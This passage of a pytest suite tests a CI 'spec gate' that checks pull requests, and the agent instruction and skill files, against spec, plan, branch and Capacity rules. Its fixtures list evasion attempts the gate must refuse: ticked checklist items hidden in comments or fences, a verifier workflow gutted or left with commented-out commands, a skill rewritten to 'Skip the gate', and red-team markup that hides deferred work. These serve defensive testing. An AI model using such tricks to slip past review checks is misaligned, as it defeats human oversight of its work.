        ((('PR_HEAD_REF', 'chore/gate-suite'),), ('tests/scripts/test_spec_gate.py',), '947381d7b8912bb4799ff5e0ed54466cc0a0da8c1ee987ac7e34d26bd7183540', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - tests/scripts/test_spec_gate.py: uses `a test name rebound`; the gate's suites carry no skip markers, collection hooks or exits",)),
        ((('PR_HEAD_REF', 'bot/superpowers-x'),), ('.claude/skills/vendored/SKILL.md',), '7799d6e6677b8ce6cd785ed3f4c24a19b185868400d9bef003fec5796ba6361f', None, 0, (), 1, (" - branch 'bot/superpowers-x' changes 1 gated file(s) (.claude/skills/vendored/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-x'),), ('.claude/skills/vendored/SKILL.md',), '963ffc16be60059fe888dd96b9545839f6190f0e1bfe8a336e50509e4ce88181', None, 0, (), 1, (" - branch 'bot/superpowers-x' changes 1 gated file(s) (.claude/skills/vendored/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-x'),), ('.claude/skills/vendored/SKILL.md',), '818e3c8f3cffe91d0fae6d778bf55ca47327877b220337e3d4ee6b16f771802f', None, 0, (), 0, ()),
        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '139f843bd5af7111d97337030efe5622c9a5439e909d526ba6e570c38db78642', None, 0, (), 1, (" - docs/product/canvases.yml: canvas 'Models' (refresh) lacks source_json; the refresh skill reads them",)),
        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '837148534ea4d1ce759c85d3134c31aa3144db21eaa6ab4b83701ef247b5f896', None, 0, (), 1, (" - docs/product/canvases.yml: canvas 'Models' (refresh) lacks boards; the refresh skill reads them",)),
        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '4b7c088808f3fc3084a3fb54e47256b1bd75dfd5c727cd61990896dcbd33b940', None, 0, (), 1, (" - docs/product/canvases.yml: canvas 'Architecture' (report-only) lacks source_docs; the refresh skill reads them",)),
        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '8abd0bc70635ba6b2acdf2437a75e483a2b9d25fe2d3bd4fe79b8b09a0fe182e', None, 0, (), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py', 'package.json'), 'fa45b2e4a6540af6fe20c5eb0789f4df887b84b44ee9982eea00098a6df39332', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (package.json) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'ba9221ad8e5451d79640c324cd10ccda7ffc3b857ea98b724fdae93a49271ba9', 0, ('see issue 42',), 1, (" - PR body's Capacity section gives no number for Volume, Velocity, Wall-clock, 30; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
    ),
}
# ---------------------------------------------------------------------------------------------



def test_a_workload_change_carries_its_capacity_numbers(repo):
    """stocks#1205 r4118289674 (spec_gate.py:313).

    A PR changing a Cloud Run job or a workflow could leave the template's
    Capacity line blank and pass, although CLAUDE.md rule 0 makes the three
    numbers and the cost mandatory. With a change under gcp/ or
    .github/workflows/ the body must give them, or an `n/a: <why>`.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    blank = body() + "\n\n## Capacity (CLAUDE.md rule 0)\nVolume: \u00b7 Velocity: \u00b7 Wall-clock: \u00b7 $/run \u00d7 runs/day \u00d7 30: \u00b7 Cost:\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=blank)
    assert r.returncode == 1 and ("Capacity section leaves Volume, Velocity, Wall-clock, 30 blank" in r.stdout or "Capacity section leaves Volume, Velocity, Wall-clock, Cost blank" in r.stdout), r.stdout
    r = pr(repo, BRANCH, job, **title, PR_BODY=body())
    assert r.returncode == 1 and "PR body needs a Capacity section" in r.stdout, r.stdout
    filled = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=filled).returncode == 0
    na = body() + "\n\n## Capacity\nn/a: the job's log line changes, no query or schedule does\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=na).returncode == 0
    # solyra#72 r4119408320: nested headings inside the section belong to it
    nested = (body() + "\n\n## Capacity\n\n### Volume\n3 tickers \u00d7 400 B\n\n### Velocity\n1 query\n\n### Wall-clock\n2 s\n\n"
              "### $/run \u00d7 runs/day \u00d7 30\n$0.01\n\n## Summary\nx\n")
    nested = nested.replace("### Volume\n3", "### Volume\nVolume: 3").replace("### Velocity\n1", "### Velocity\nVelocity: 1") \
                   .replace("### Wall-clock\n2", "### Wall-clock\nWall-clock: 2").replace("30\n$0.01", "30\n30: $0.01 \u00b7 Cost: $0.01")
    assert pr(repo, BRANCH, job, **title, PR_BODY=nested).returncode == 0, nested
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=body()).returncode == 0
    # solyra#72 r4118831965: a chore/ PR editing the gate's own workflow is untraced and
    # still changes what CI runs, so the Capacity check does not hide behind the trace
    workflow = {".github/workflows/spec-gate.yml": gate_workflow()}
    r = pr(repo, "chore/gate-workflow", workflow, PR_BODY="## Summary\n\nretune the gate\n")
    assert r.returncode == 1 and "PR body needs a Capacity section" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", workflow, PR_BODY="## Capacity\nn/a: one PR-triggered job, seconds\n").returncode == 0
    # stocks#1205 r4119001303 (P1): the gate's entrypoints cannot be deleted, chore/ or not
    # solyra#72 r4119610915 (P1): nor the catalog the gate reads FEAT-IDs from
    r = pr(repo, "docs/cleanup", {CATALOG: None})
    assert r.returncode == 1 and "policy documents cannot be removed" in r.stdout, r.stdout
    on_base(repo, {".github/workflows/spec-gate.yml": "on: pull_request_target\n", ".githooks/pre-commit": "#!/bin/sh\n"})
    for entry, r in each_pr(repo, lambda entry: pr_case("chore/gate-workflow", {entry: None}, PR_BODY="## Capacity\nn/a: x\n"), (".github/workflows/spec-gate.yml", ".githooks/pre-commit")):   # the script itself runs these tests
        assert r.returncode == 1 and "cannot be removed by a change" in r.stdout, (entry, r.stdout)
    # solyra#72 r4119505510 (P1): the head-run verifier cannot be gutted by the PR it verifies;
    # the base's gate holds it to its steps
    gutted = "name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo ok\n"
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": gutted}, PR_BODY="## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    # solyra#72 r4119610895 (P1): the commands must be executed, not mentioned in a comment
    commented = gutted + "".join(f"      # {m}\n" for m in ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"',
                                                         "python3 -m pytest tests/scripts/test_spec_gate.py", 'git ls-tree "$HEAD_SHA" .githooks/pre-commit',
                                                         'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"'))
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": commented}, PR_BODY="## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    kept = gutted.replace("      - run: echo ok\n", "      - run: |\n          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n          python3 -m pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    assert pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": kept}, PR_BODY="## Capacity\nn/a: x\n").returncode == 0
    # solyra#72 r4118957767 (P1): a gate file entry is exact, so a workflow named after
    # one is still a workflow a chore/ branch cannot add
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml-backdoor.yaml": "on: push\n"},
           PR_BODY="## Capacity\nn/a: x\n")
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {"scripts/gate/helper.py": "x = 1\n"})
    assert r.returncode == 1 and "scripts/gate/ holds" in r.stdout, r.stdout   # stocks#1205 r4121413687: no third module there
    # stocks#1205 r4119299883: an allowance needs the full branch shape
    # stocks#1205 r4119416484: a chore/ or bot/ branch is limited to its allowance for every file
    r = pr(repo, "chore/deps", {REQUIREMENTS: "# Requirements\n\nrewritten\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    r = pr(repo, "bot/superpowers-weekly", {"docs/notes.md": "# notes\n", ".claude/skills/brainstorming/SKILL.md": "# v2\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    for name, r in each_pr(repo, lambda name: pr_case(name, {"scripts/gate/helper.py": "x = 1\n"}, PR_HEAD_REF=name), ("chore/foo/bar", "chore/Bad", "bot/superpowers-x/y")):
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (name, r.stdout)
    # solyra#72 r4119153686: the vendored-skills update may not touch the repository's own skills
    assert pr(repo, "bot/superpowers-weekly", {".claude/skills/brainstorming/SKILL.md": "# v2\n"}).returncode == 0
    r = pr(repo, "bot/superpowers-weekly", {".claude/skills/product-delivery/SKILL.md": "# Skip the gate\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    # stocks#1205 r4119162185: a documentation-only PR still comes from a delivery branch
    for name, r in each_pr(repo, lambda name: pr_case(name, {"docs/notes.md": "# Notes\n"}, PR_HEAD_REF=name), ("main", "typo", "claude/notes", "feature/typo", "fix/wrong", "docs/Bad_Name",
                 "feature/feat-model-001-a_b", "fix/feat-model-001-a.b")):   # r4119416443: kebab-case slugs only
        assert r.returncode == 1 and "is not a delivery branch" in r.stdout, (name, r.stdout)
    assert pr(repo, "docs/notes", {"docs/notes.md": "# Notes\n"}).returncode == 0
    # solyra#72 r4119610902: a feature branch touching only its own row is still traced
    r = pr(repo, BRANCH, {CATALOG: CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")},
           PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body(ticked=True), PR_NUMBER="42", PR_DRAFT="false")
    assert r.returncode == 1 and "Traceback" not in r.stderr and "no plan in" not in r.stdout, r.stdout + r.stderr
    on_base(repo, {PLAN: None})
    r = pr(repo, BRANCH, {CATALOG: CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")})
    assert r.returncode == 1 and "no plan in" in r.stdout, r.stdout
    on_base(repo, {PLAN: plan()})
    # solyra#72 r4119610921: CI configuration is FEAT-CICD-001's work where the catalog has it
    cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
    on_base(repo, {CATALOG: cicd_row})
    r = pr(repo, BRANCH, {**CODE, ".github/workflows/ci.yml": "on: push\n"}, PR_TITLE="FEAT-MODEL-001: x",
           PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
    on_base(repo, {CATALOG: CATALOG_TEXT})
    assert pr(repo, BRANCH, {**CODE, ".github/workflows/ci.yml": "on: push\n"}, PR_TITLE="FEAT-MODEL-001: x",
              PR_BODY=body() + "\n\n## Capacity\nn/a: x\n").returncode == 0
    # stocks#1205 r4119509833: so are the root instructions that tell agents to run it
    for path, r in each_pr(repo, lambda path: pr_case("docs/tweak", {path: "# Nothing to do here\n"}), ("AGENTS.md", "CLAUDE.md")):
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (path, r.stdout)
    # stocks#1205 r4119048063: the delivery skill is the process agents run, not its description
    r = pr(repo, "docs/skill-tweak", {".claude/skills/product-delivery/SKILL.md": "# Skip the gate\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    # stocks#1205 r4118890018: documentation under a workload prefix runs nothing
    docs = {".github/workflows/README.md": "# Workflows\n", "gcp/README.md": "# Jobs\n"}
    assert pr(repo, "docs/workflow-notes", docs, PR_BODY="## Summary\n\nnotes\n").returncode == 0


def test_a_plan_on_the_base_stays_bound_to_its_branch_and_pr(repo):
    """solyra#72 r4118831949 (spec_gate.py:395).

    The plan was picked by the branch it names at the head, so another branch
    could edit a plan already on the base (even one marked done after its PR
    merged) to name itself, swap the PR number and restore status: ready. A plan
    on the base keeps its branch and PR, and a done plan authorizes nothing more.
    """
    other = "feature/feat-model-001-second-try"
    on_base(repo, {PLAN: plan(pr=12, status="done")})
    rebound = plan(branch=other, pr=13)
    r = pr(repo, other, {**CODE, PLAN: rebound}, PR_HEAD_REF=other)
    assert r.returncode == 1, r.stdout
    assert f"names branch '{BRANCH}' on the base" in r.stdout and "records PR #12" in r.stdout, r.stdout
    assert "status: done on the base" in r.stdout, r.stdout
    # the plan's own branch may fill in a PR number it never had, and keep the one it has
    on_base(repo, {PLAN: plan()})
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42)}).returncode == 0
    on_base(repo, {PLAN: plan(pr=42)})
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42)}).returncode == 0
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=43)})
    assert r.returncode == 1 and "records PR #42" in r.stdout, r.stdout


def test_a_plan_names_its_feat_id(repo):
    """solyra#72 r4118878750 (spec_gate.py:267).

    `feat_id: ""` passed the type check and skipped the mismatch check because the
    value was falsy, so a plan with no FEAT-ID authorized code. The key must hold
    the branch's FEAT-ID, nothing less.
    """
    for value, r in each_pr(repo, lambda value: pr_case(BRANCH, {**CODE, PLAN: plan(feat_id=value)}), ('""', "null", "[FEAT-MODEL-001]")):
        assert r.returncode == 1 and "but the branch serves FEAT-MODEL-001" in r.stdout, (value, r.stdout)


def test_hidden_checklist_entries_do_not_count(repo):
    """stocks#1205 r4118374587 (spec_gate.py:398).

    The checklist parser read every line, so a ticked done_when item inside an
    HTML comment (the PR template's) or a fenced code example counted as done
    while the rendered body showed nothing. Comments and fences are removed
    before the body is parsed, for the checklist, the canvas markers and the
    Capacity section alike.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_NUMBER": "42"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    files = {**CODE, PLAN: plan(pr=42), CATALOG: row}
    hidden = (f"Spec: {SPEC}\nPlan: {PLAN}\n\n<!--\n- [x] {DONE[0]}\n-->\n```\n- [x] {DONE[1]}\n```\n"
              f"\n- [ ] {DONE[0]}\n- [ ] {DONE[1]}\n")
    r = pr(repo, BRANCH, files, **meta, PR_BODY=hidden, PR_DRAFT="false")
    assert r.returncode == 1 and "done_when item(s) not ticked" in r.stdout, r.stdout
    assert pr(repo, BRANCH, files, **meta, PR_BODY=body(ticked=True), PR_DRAFT="false").returncode == 0

    # stocks#1205 r4119299917: a path is linked as a whole token
    lookalike = f"Spec: {SPEC}.old\nPlan: {PLAN}-v2\n\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=lookalike)
    assert r.returncode == 1 and "must link the spec" in r.stdout and "must link the plan" in r.stdout, r.stdout
    linked = f"[spec](https://example.test/blob/main/{SPEC}) [plan](https://example.test/blob/main/{PLAN})\n\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=linked).returncode == 0
    # stocks#1205 r4119162200: an unclosed comment hides everything after it
    unclosed = f"Notes\n<!--\nSpec: {SPEC}\nPlan: {PLAN}\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=unclosed)
    assert r.returncode == 1 and "PR body must link the spec" in r.stdout, r.stdout
    # solyra#72 r4119153674: an indented line after plain text or a blank is not a checkbox
    # continuation, and must not crash the gate
    nested = f"Spec: {SPEC}\nPlan: {PLAN}\n\nNotes\n  - a nested bullet\n\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=nested)
    assert r.returncode == 0 and "Traceback" not in r.stderr, r.stdout + r.stderr
    # solyra#72 r4119153683: a fence nested under a list item is indented four spaces and is
    # still code
    fenced_item = f"- [ ] example\n\n    ```\n    Spec: {SPEC}\n    Plan: {PLAN}\n    - [x] {DONE[0]}\n    - [x] {DONE[1]}\n    ```\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=fenced_item)
    assert r.returncode == 1 and "PR body must link the spec" in r.stdout, r.stdout
    # stocks#1205 r4119048047: a closer mixing the two fence characters does not close a
    # backtick fence for Markdown, so everything after it is still code
    mixed = f"Spec: {SPEC}\nPlan: {PLAN}\n\n```\nexample\n```~~~\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=mixed)
    assert r.returncode == 1 and "must carry each done_when item" in r.stdout, r.stdout


def test_a_spike_never_opens_a_pull_request(repo):
    """stocks#1205 r4118374586 (spec_gate.py:315).

    A spike/ PR carrying only its investigation note had no gated file, so the
    gate passed it, although a spike is local commits only. In PR mode a spike/
    branch fails whatever it changes; in commit mode it still passes anything.
    """
    r = pr(repo, "spike/try", {"docs/spikes/try.md": "# Notes\n"})
    assert r.returncode == 1 and "is a spike: local investigation commits only" in r.stdout, r.stdout
    assert pr(repo, "spike/try", CODE).returncode == 1
    _git(repo, "checkout", "-q", "-B", "spike/try", "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    assert gate(repo, "--commit").returncode == 0


def test_only_a_merge_of_main_is_measured_against_merge_head(repo):
    """stocks#1205 r4118374592 (spec_gate.py:699).

    Every merge in progress was measured against MERGE_HEAD, so a merge into
    main saw an empty diff and passed, and a feature branch merging another
    feature's commits was judged only on its own side. Now: a local merge into
    main is refused; a branch merging main is measured against main's side; a
    branch merging anything else is measured against HEAD, as its own change.
    """
    _git(repo, "checkout", "-q", "-B", "feature/feat-data-001-other", "base")
    write(repo, "lib/other.py", "x = 1\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "other feature's code")
    _git(repo, "checkout", "-q", "main")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "feature/feat-data-001-other")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "a merge into main is committed locally" in r.stdout, r.stdout
    _git(repo, "merge", "--abort")

    _git(repo, "checkout", "-q", "-B", "docs/typo", "base")
    write(repo, "docs/notes.md", "# Notes\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "docs")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "feature/feat-data-001-other")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "lib/other.py" in r.stdout, r.stdout
    _git(repo, "merge", "--abort")

    _git(repo, "checkout", "-q", "main")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "code on main")
    _git(repo, "checkout", "-q", "docs/typo")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "main")
    assert gate(repo, "--commit").returncode == 0, "merging main into a docs branch"


def test_the_pr_body_contract_is_read_as_rendered_in_every_form(repo):
    """solyra#72 r4118418388 and stocks#1205 r4118420392 (spec_gate.py:463): the spec
    and plan paths hidden in a comment passed the substring check. stocks#1205
    r4118420390 (:404): a fence indented up to three spaces, or closed by a longer
    fence, was not stripped. solyra#72 r4118418411 (:503): `Volume:` followed by a
    newline borrowed the next label as its value.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    hidden_links = f"<!-- Spec: {SPEC} Plan: {PLAN} -->\n\n- [ ] {DONE[0]}\n- [ ] {DONE[1]}\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=hidden_links)
    assert r.returncode == 1 and "must link the spec" in r.stdout and "must link the plan" in r.stdout, r.stdout
    fenced = (f"Spec: {SPEC}\nPlan: {PLAN}\n\n   ```\n- [x] {DONE[0]}\n````\n\n~~~text\n- [x] {DONE[1]}\n~~~\n"
              f"- [ ] {DONE[0]}\n- [ ] {DONE[1]}\n")
    meta = {**title, "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=fenced)
    assert r.returncode == 1 and "done_when item(s) not ticked" in r.stdout, r.stdout
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    split = body() + "\n\n## Capacity\nVolume:\nVelocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=split)
    assert r.returncode == 1 and "leaves Volume blank" in r.stdout, r.stdout


def test_each_done_when_item_needs_its_own_checkbox(repo):
    """stocks#1205 r4118420395 (spec_gate.py:465).

    `run the tests` and `run the tests on 3.12` were both satisfied by one
    checkbox carrying the longer text. Each item now claims its own line,
    longest first, in the body check and the close-out check alike.
    """
    on_base(repo, {SPEC: spec(done_when=["run the tests", "run the tests on 3.12"])})
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    one_box = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [ ] run the tests on 3.12\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=one_box)
    assert r.returncode == 1 and "missing: run the tests" in r.stdout, r.stdout
    two = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [ ] run the tests on 3.12\n- [ ] run the tests (make test)\n"
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=two).returncode == 0


def test_a_done_when_item_matches_as_written_or_as_rendered(repo):
    """solyra#82: the body is read rendered, so `docs/**` pasted from the spec read `docs/`
    and no spelling of the box could match an item holding `**`. A box now also counts as
    written, where its reader sees the item's rendered text first; the item is never rendered,
    so a box that drops the stars does not carry it (stocks#1343 r4207817356), and neither does a
    link straddling the item's end or a box going on with its last word (red-team, this PR)."""
    item = "e2e.yml has paths-ignore: ['docs/**', '**/*.md']"
    on_base(repo, {SPEC: spec(done_when=[item])})
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    ok = lambda boxes: pr(repo, BRANCH, CODE, **title, PR_BODY=f"Spec: {SPEC}\nPlan: {PLAN}\n\n{boxes}")
    oks = lambda bodies: pr_each(repo, BRANCH, CODE, [f"Spec: {SPEC}\nPlan: {PLAN}\n\n{b}" for b in bodies], **title)
    assert ok(f"- [ ] {item}\n").returncode == 0
    for wrong, r in judged(oks, str, ("- [ ] e2e.yml has paths-ignore: ['docs/', '/.md']\n", f"<!-- - [x] {item} -->\n",
                  "- [ ] e2e.yml has paths-ignore: `['docs/**', '**/*.md']`\n")):   # a code span folds `**` here too, as on main
        assert r.returncode == 1 and "missing: e2e.yml" in r.stdout, (wrong, r.stdout)
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    meta = {**title, "PR_NUMBER": "42", "PR_DRAFT": "false"}
    done = lambda boxes: pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=f"Spec: {SPEC}\nPlan: {PLAN}\n\n{boxes}")
    dones = lambda bodies: pr_each(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, [f"Spec: {SPEC}\nPlan: {PLAN}\n\n{b}" for b in bodies], **meta)
    assert done(f"- [x] {item} (actionlint)\n").returncode == 0
    for tail, r in judged(dones, lambda tail: f"- [x] {item}{tail}\n", (", follow-up", " **follow**-up", " [follow](u)-up", " [see](\n  - follow-up)", " [see](\n  - [x] follow-up)", " [see](\n\n  follow-up)", ", fol<a x=*>low-up", " (not <a x=_>run)", ", fol![](i.png)low-up", " (not ![](i.png)run)", ", fol<low-up:&lt;>", " (not ~~run~~ <pend~~ing~~)", " &lt;follow<!X <br>-up",
                 " skipp![](i[](x).png)ed", ", non\\-blocking", " \\[lo](x)not run", ", r[](x\\)later PR",
                 " ([lo](xr<a x=_>)pending", ", <x a=', p`ending&#108;`", "\n  > pending", "<!X \n`>  later PR",
                 " not d`one[lo](x)`", ", \n&#45; pending", ", fo![r\\[](i.png)llow-up", ", not<brun\n  >later PR",
                 " (pendin<a unx=\n  _>g", " (*ing&#108;*~~pend*ing", ", follow\\-up\\not", " (later\n\n    PR)",
                 ", follow\n  ---\n  up", " (not<br>run)", ", later<br>PR", ", for<br/>now", "\n| not run, follow-up PR",
                 "\n  | pending", "\n  # follow-up", "\n\n\n    not run", ", pen` ding, ` low")):
        # refused as deferring, or as markup it cannot read for a deferral
        assert r.returncode == 1 and ("defers its work" in r.stdout or "cannot read for a deferral" in r.stdout), (tail, r.stdout)
    # an underscore inside a word is no marker, and a no-break space before a count is a space (red-team, this PR)
    for tail, r in judged(dones, lambda tail: f"- [x] {item}{tail}\n", (" (`x.to(dev, non_blocking=True)`)", " with non_blocking=True", " (incl. `follow_up`)",
                 ": 12 passed, 0&nbsp;skipped", ": 12 passed, 0\u00a0skipped")):
        assert r.returncode == 0, (tail, r.stdout)
    # what follows a done item with markup is words, code spans, links, autolinks and bare inline tags, or refused
    # (red-team, this PR); main never matched such an item
    for tail, r in judged(dones, lambda tail: f"- [x] {item}{tail}\n", (" <a x=*>ok</a>", " *done* here", " <?x?> ok", " \\[x] ok", " ~~old~~ ok", " _ok_", ", \\[a](b) ok", ", \\![a](b) ok")):
        assert r.returncode == 1 and "cannot read for a deferral" in r.stdout, (tail, r.stdout)
    for tail, r in judged(dones, lambda tail: f"- [x] {item}{tail}\n", (" <https://ci.example.com/1>", " <ins>now</ins>", " ![ok](i.png)", " [log](https://ci.example.com/1)",
                 " (`npm test`: 12 passed)", " ~2 min", " -> 3 s", "<br>in CI", " (a < b holds)", " - p<0.05",
                 " - 3 * 4 = 12", " (C:\\tmp)", " (`12` passed, `0` skipped)")):
        assert r.returncode == 0, (tail, r.stdout)
    # a verbatim box beside one a reader sees as the item is two lines for it (red-team, this PR)
    r = done(f"- [x] {item}\n- [ ] e2e.yml has paths-ignore: ['docs/', '/.md']\n")
    assert r.returncode == 1 and "more than one checkbox line" in r.stdout, r.stdout
    # an HTML block inside a ticked box the gate cannot read as GitHub shows it (red-team, this PR)
    r = done(f"- [x] {item} (actionlint)\n  <?x>run</x>\n")
    assert r.returncode == 1 and "HTML block the gate cannot read" in r.stdout, r.stdout
    r = done(f"- [x] {item} (actionlint)\n\n  <div>not run\n")
    assert r.returncode == 1 and "HTML block the gate cannot read" in r.stdout, r.stdout
    # an entity GitHub shows as text, read as a comment opener, would move the body's lines (red-team, this PR)
    r = done(f"- [x] {item}\n\nwe strip &lt;!-- and\n\nthe rest --&gt; here\n")
    assert r.returncode == 1 and "splits into lines otherwise" in r.stdout, r.stdout
    assert done(f"- [x] {item}\n\nwe strip `<!--` and &lt; here\n").returncode == 0
    # a tag split across the copy's lines hides as it does on one line (red-team, this PR)
    r = done(f"- [x] {item}\n- [ ] e2e.yml has paths-<a title='x\n  y'>ignore: docs/**, **/*.md (not run)\n")
    assert r.returncode == 1 and "more than one checkbox line" in r.stdout, r.stdout
    # a deferring copy that the body read twice hides is read past its letters, however short it renders
    r = done(f'<img alt="i" src="a.png"> <br>\n- [x] e2e.yml has paths-ignore: docs/**, **/*.md, not run\n\n- [x] {item}\n')
    assert r.returncode == 1 and "defers its work" in r.stdout, r.stdout
    for one, others in (("the `tsc` build passes", ["the tsc build passes"]), ("the [registry](docs/r.md) test passes", ["the registry test passes"]),
                        ("no `SELECT *` on the hot path", ["no SELECT * on the hot path", "no <ins>SELECT</ins> * on the hot path"]),
                        ("the loop guard `i<n` is checked", ["the loop guard i<n is checked (not run -> next PR)"])):
        on_base(repo, {SPEC: spec(done_when=[one])})
        assert done(f"- [x] {one}\n").returncode == 0
